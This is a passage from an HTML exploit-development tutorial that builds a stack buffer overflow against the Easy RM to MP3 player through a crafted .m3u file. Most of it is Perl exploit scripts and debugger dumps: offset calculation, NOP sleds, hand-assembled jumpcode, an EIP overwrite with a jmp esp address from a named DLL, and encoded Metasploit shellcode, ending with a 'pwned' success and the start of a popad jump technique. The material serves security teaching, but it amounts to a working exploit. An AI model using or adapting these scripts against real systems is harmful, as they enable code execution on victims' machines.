000ff870  38 41 6a 39 41 6b 30 41-6b 31 41 6b 32 41 6b 33  8Aj9Ak0Ak1Ak2Ak3
000ff880  41 6b 34 41 6b 35 41 6b-36 41 6b 37 41 6b 38 41  Ak4Ak5Ak6Ak7Ak8A
000ff890  6b 39 41 6c 30 41 6c 31-41 6c 32 41 6c 33 41 6c  k9Al0Al1Al2Al3Al
000ff8a0  34 41 6c 35 41 6c 36 41-6c 37 41 6c 38 41 6c 39  4Al5Al6Al7Al8Al9</unloaded_p32.dll></pre>
</div>
<p>What we see at 000ff849 is definitely part of the pattern.&nbsp; The first 4 characters are 5Ai6</p>
<p><a href="/wp-content/uploads/2009/07/image23.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img loading="lazy" decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="150" alt="image" src="/wp-content/uploads/2009/07/image_thumb23.png" width="275" border="0"></a></p>
<p>Using metasploit pattern_offset utility, we see that these 4 characters are at offset 257.&nbsp; So instead of putting 26094 A’s in the file, we’ll put 257 A’s, then our shellcode, and fill up the rest of the 26094 characters with A’s again. Or even better, we’ll start with only 250 A’s, then 50 NOP’s, then our shellcode, and then fill up the rest with A’s.&nbsp; That way, we don’t have to be very specific when jumping… If we can land in the NOP’s before the shellcode, it will work just fine.</p>
<p>Let’s see how the script and stack look like when we set this up :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $buffersize = 26094;

my $junk= <span style="color: #006080">"A"</span> x 250;
my $nop = <span style="color: #006080">"\x90"</span> x 50;
my $shellcode = <span style="color: #006080">"\xcc"</span>;

my $restofbuffer = <span style="color: #006080">"A"</span> x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = <span style="color: #006080">"BBBB"</span>;
my $preshellcode = <span style="color: #006080">"X"</span> x 54;  #let<span style="color: #006080">'s pretend this is the only space we have available
my $nop2 = "\x90" x 230;  #added some nops to visually separate our 54 X'</span>s from other data

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print <span style="color: #006080">"Size of buffer : "</span>.length($buffer).<span style="color: #006080">"\n"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $buffer.$eip.$preshellcode.$nop2;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>When the application dies, we can see our 50 NOPs&nbsp; starting at 000ff848, followed by the shellcode (0x90&nbsp; at 000ff874), and then again followed by the A’s.&nbsp; Ok, that looks fine.</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">(188.c98): Access violation - code c0000005 (!!! second chance !!!)
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0x42424231:
42424242 ??              ???
0:000&gt; d esp
000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff740  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff750  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ff760  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............
000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ff7b0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7c0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7d0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7e0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7f0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff800  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff810  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff820  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ff830  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff840  90 90 90 90 90 90 90 90-00 90 90 90 90 90 90 90  ................
000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA
000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
</div>
<p>The second thing we need to do is build our jumpcode that needs to be placed at ESP. The goal of the jumpcode is to jump to ESP+281</p>
<p>Writing jump code is as easy as writing down the required statements in assembly and then translating them to opcode (making sure that we don’t have any null bytes or other restricted characters at the same time) :-)</p>
<p>Jumping to ESP+281 would require : Add 281 to the ESP register, and then perform jump esp. 281 = 119h. Don’t try to add everything in one shot, or you may end up with opcode that contains null bytes.</p>
<p>Since we have some flexibility (due to the NOP’s before our shellcode), we don’t have to be very precise either.&nbsp; As long as we add 281 (or more), it will work.&nbsp; We have 50 bytes for our jumpcode, but that should not be a problem.</p>
<p>Let’s add 0x5e&nbsp; (94) to esp, 3 times. Then do the jump to esp.&nbsp; The assembly commands are :</p>
<ul>
<li>add esp,0x5e </li>
<li>add esp,0x5e </li>
<li>add esp,0x5e </li>
<li>jmp esp </li>
</ul>
<p>Using windbg, we can get the opcode :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">0:014&gt; a
7c901211 add esp,0x5e
add esp,0x5e
7c901214 add esp,0x5e
add esp,0x5e
7c901217 add esp,0x5e
add esp,0x5e
7c90121a jmp esp
jmp esp
7c90121c 

0:014&gt; u 7c901211
ntdll!DbgBreakPoint+0x3:
7c901211 83c45e          add     esp,5Eh
7c901214 83c45e          add     esp,5Eh
7c901217 83c45e          add     esp,5Eh
7c90121a ffe4            jmp     esp</pre>
</div>
<p>Ok, so the opcode for the entire jumpcode is 0x83,0xc4,0x5e,0x83,0xc4,0x5e,0x83,0xc4,0x5e,0xff,0xe4</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $buffersize = 26094;

my $junk= <span style="color: #006080">"A"</span> x 250;
my $nop = <span style="color: #006080">"\x90"</span> x 50;
my $shellcode = <span style="color: #006080">"\xcc"</span>;  #position 300

my $restofbuffer = <span style="color: #006080">"A"</span> x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = <span style="color: #006080">"BBBB"</span>;
my $preshellcode = <span style="color: #006080">"X"</span> x 4;
my $jumpcode = <span style="color: #006080">"\x83\xc4\x5e"</span> .   #add esp,0x5e
   <span style="color: #006080">"\x83\xc4\x5e"</span> .               #add esp,0x5e
   <span style="color: #006080">"\x83\xc4\x5e"</span> .               #add esp,0x5e
   <span style="color: #006080">"\xff\xe4"</span>;                    #jmp esp

my $nop2 = <span style="color: #006080">"0x90"</span> x 10;   # only used to visually separate

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print <span style="color: #006080">"Size of buffer : "</span>.length($buffer).<span style="color: #006080">"\n"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>&nbsp;</div>
<div>The jumpcode is perfectly placed at ESP.&nbsp; When the shellcode is called, ESP would point into the NOPs (between 00ff842 and 000ff873). Shellcode starts at 000ff874</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">(45c.f60): Access violation - code c0000005 (!!! second chance !!!)
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0x42424231:
42424242 ??              ???
0:000&gt; d esp
000ff730  83 c4 5e 83 c4 5e 83 c4-5e ff e4 00 01 00 00 00  ..^..^..^.......
000ff740  30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41  0.......AAAAAAAA
000ff750  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff760  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff770  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff780  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff790  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
000ff7b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
000ff830  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff840  41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90  AA..............
000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA
000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
</div>
<div>&nbsp;</div>
<p>The last thing we need to do is overwrite EIP with a “jmp esp”.&nbsp; From part 1 of the tutorial, we know that this can be achieved via address 0x01ccf23a</p>
<p>What will happen when the overflow occurs ?</p>
<ul>
<li>Real shellcode will be placed in the first part of the string that is sent, and will end up at ESP+300.&nbsp; The real shellcode is prepended with NOP’s to allow the jump to be off a little bit </li>
<li>EIP will be overwritten with 0x01ccf23a (points to a dll, run “JMP ESP”) </li>
<li>The data after overwriting EIP will be overwritten with jump code that adds 282 to ESP and then jumps to that address. </li>
<li>After the payload is sent, EIP will jump to esp. This will triggger the jump code to jump to ESP+282.&nbsp; Nop sled, and shellcode gets executed. </li>
</ul>
<p>Let’s try with a break as real shellcode :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $buffersize = 26094;

my $junk= <span style="color: #006080">"A"</span> x 250;
my $nop = <span style="color: #006080">"\x90"</span> x 50;
my $shellcode = <span style="color: #006080">"\xcc"</span>;  #position 300

my $restofbuffer = <span style="color: #006080">"A"</span> x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = pack(<span style="color: #006080">'V'</span>,0x01ccf23a);  #jmp esp from MSRMCcodec02.dll

my $preshellcode = <span style="color: #006080">"X"</span> x 4;
my $jumpcode = <span style="color: #006080">"\x83\xc4\x5e"</span> .   #add esp,0x5e
   <span style="color: #006080">"\x83\xc4\x5e"</span> .               #add esp,0x5e
   <span style="color: #006080">"\x83\xc4\x5e"</span> .               #add esp,0x5e
   <span style="color: #006080">"\xff\xe4"</span>;                    #jmp esp

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print <span style="color: #006080">"Size of buffer : "</span>.length($buffer).<span style="color: #006080">"\n"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>The generated m3u file will bring us right at our shellcode (which is a break). (EIP = 0x000ff874 = begin of shellcode )</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">(d5c.c64): Break instruction exception - code 80000003 (!!! second chance !!!)
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608
eip=<strong><span style="color: #ff0000">000ff874</span></strong> esp=000ff84a ebp=003440c0 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0xff863:
000ff874 cc              <span style="color: #5576D1">int</span>     3
0:000&gt; d esp
000ff84a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff85a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff86a  90 90 90 90 90 90 90 90-90 90 <strong><span style="color: #ff0000">cc</span></strong> 41 41 41 41 41  ...........AAAAA
000ff87a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff88a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff89a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8aa  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff8ba  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
</div>
<p>Replace the break with some real shellcode (and replace the A’s with NOPs)…&nbsp; (shellcode : excluded characters 0x00, 0xff, 0xac, 0xca)</p>
<p>When you replace the A’s with NOPs, you’ll have more space to jump into, so we can live with jumpcode that only jumps 188 positions further (2 times 5e)</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $buffersize = 26094;

my $junk= <span style="color: #006080">"\x90"</span> x 200;
my $nop = <span style="color: #006080">"\x90"</span> x 50;

# windows/exec - 303 bytes
# http:<span style="color: #d7df01">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode = <span style="color: #006080">"\x89\xe2\xd9\xeb\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49"</span> .
<span style="color: #006080">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .
<span style="color: #006080">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .
<span style="color: #006080">"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"</span> .
<span style="color: #006080">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d"</span> .
<span style="color: #006080">"\x38\x51\x54\x45\x50\x43\x30\x45\x50\x4c\x4b\x51\x55\x47"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x43\x4c\x44\x45\x43\x48\x43\x31\x4a\x4f\x4c"</span> .
<span style="color: #006080">"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x45\x51\x4a"</span> .
<span style="color: #006080">"\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x46"</span> .
<span style="color: #006080">"\x51\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x44\x34\x45"</span> .
<span style="color: #006080">"\x57\x49\x51\x49\x5a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c"</span> .
<span style="color: #006080">"\x34\x47\x4b\x50\x54\x51\x34\x45\x54\x44\x35\x4d\x35\x4c"</span> .
<span style="color: #006080">"\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44"</span> .
<span style="color: #006080">"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"</span> .
<span style="color: #006080">"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4b\x39\x51\x4c\x46"</span> .
<span style="color: #006080">"\x44\x45\x54\x48\x43\x51\x4f\x46\x51\x4c\x36\x43\x50\x50"</span> .
<span style="color: #006080">"\x56\x43\x54\x4c\x4b\x47\x36\x46\x50\x4c\x4b\x47\x30\x44"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x44"</span> .
<span style="color: #006080">"\x48\x4d\x59\x4c\x38\x4d\x53\x49\x50\x42\x4a\x46\x30\x45"</span> .
<span style="color: #006080">"\x38\x4c\x30\x4c\x4a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b"</span> .
<span style="color: #006080">"\x4e\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x42\x43\x43"</span> .
<span style="color: #006080">"\x51\x42\x4c\x45\x33\x45\x50\x41\x41"</span>;

my $restofbuffer = <span style="color: #006080">"\x90"</span> x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = pack(<span style="color: #006080">'V'</span>,0x01ccf23a);  #jmp esp from MSRMCcodec02.dll

my $preshellcode = <span style="color: #006080">"X"</span> x 4; 

my $jumpcode = <span style="color: #006080">"\x83\xc4\x5e"</span> .   #add esp,0x5e
   <span style="color: #006080">"\x83\xc4\x5e"</span> .               #add esp,0x5e
   <span style="color: #006080">"\xff\xe4"</span>;                    #jmp esp

my $nop2 = <span style="color: #006080">"0x90"</span> x 10;   # only used to visually separate

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print <span style="color: #006080">"Size of buffer : "</span>.length($buffer).<span style="color: #006080">"\n"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<p><a href="/wp-content/uploads/2009/07/image24.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img loading="lazy" decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="192" alt="image" src="/wp-content/uploads/2009/07/image_thumb24.png" width="302" border="0"></a></p>
<p>pwned again :-)</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h3>Some other ways to jump</h3>
<ul>
<li>popad </li>
<li>hardcode address to jump to </li>
</ul>
<p>the “<strong><u>popap</u></strong>” instruction may help us ‘jumping’ to our shellcode as well. popad (pop all double) will pop double words from the stack (ESP) into the general-purpose registers, in one action. The registers are loaded in the following order : EDI, ESI, EBP, EBX, EDX, ECX and EAX.&nbsp; As a result, the ESP register is incremented after each register is loaded (triggered by the popad). One popad will thus take 32 bytes from ESP and pops them in the registers in an orderly fashion.</p>
<p>The popad opcode is 0x61</p>
<p>So suppose you need to jump 40 bytes, and you only have a couple of bytes to make the jump, you can issue 2 popad’s to point ESP to the shellcode (which starts with NOPs to make up for the (2 times 32 bytes – 40 bytes of space that we need to jump over))</p>
<p>Let’s use the Easy RM to MP3 vulnerability again to demonstrate this technique :</p>
<p>We’ll reuse one of the script example from earlier in this post, and we’ll build a fake buffer that will put 13 X’s at ESP, then we’ll pretend there is some garbage (D’s and A’s) and then place to put our shellcode (NOPS + A’s)</p>
<pre class="csharpcode">my $file= <span class="str">"test1.m3u"</span>;
my $buffersize = 26094;

my $junk= <span class="str">"A"</span> x 250;
my $nop = <span class="str">"\x90"</span> x 50;
my $shellcode = <span class="str">"\xcc"</span>;

my $restofbuffer = <span class="str">"A"</span> x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = <span class="str">"BBBB"</span>;
my $preshellcode = <span class="str">"X"</span> x 17;  #let<span class="str">'s pretend this is the only space we have available
my $garbage = "\x44" x 100;  #let’s pretend this is the space we need to jump over</span>

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print <span class="str">"Size of buffer : "</span>.length($buffer).<span class="str">"\n"</span>;

open($FILE,<span class="str">"&gt;$file"</span>);
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
print <span class="str">"m3u File Created successfully\n"</span>;</pre>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<p>&nbsp;</p>
<p>After opening the file in Easy RM to MP3, the application dies, and ESP looks like this :</p>
<pre class="csharpcode">First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00104a58 ecx=7c91005d edx=003f0000 esi=77c5fce0 edi=0000666d
eip=42424242 esp=000ff730 ebp=00344158 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
Missing image name, possible paged-<span class="kwrd">out</span> or corrupt data.
Missing image name, possible paged-<span class="kwrd">out</span> or corrupt data.
Missing image name, possible paged-<span class="kwrd">out</span> or corrupt data.
<unloaded_p32.dll>+0x42424231:
42424242 ??              ???
0:000&gt; d esp
000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44  XXXXXXXXXXXXXDDD |  =&gt; 13 bytes
000ff740  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD |  =&gt; garbage
000ff750  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =&gt; garbage
000ff760  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =&gt; garbage
000ff770  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =&gt; garbage
000ff780  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =&gt; garbage
000ff790  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD | =&gt; garbage
000ff7a0  00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA | =&gt; garbage
0:000&gt; d
000ff7b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
0:000&gt; d
000ff830  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; garbage
000ff840  41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90  AA.............. | =&gt; garbage
000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................ | =&gt; NOPS/Shellcode
000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................ | =&gt; NOPS/Shellcode
000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA | =&gt; NOPS/Shellcode
000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode
000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode
000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode</unloaded_p32.dll></pre>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }</style>
<style type="text/css">
<p>.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #d7df01; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
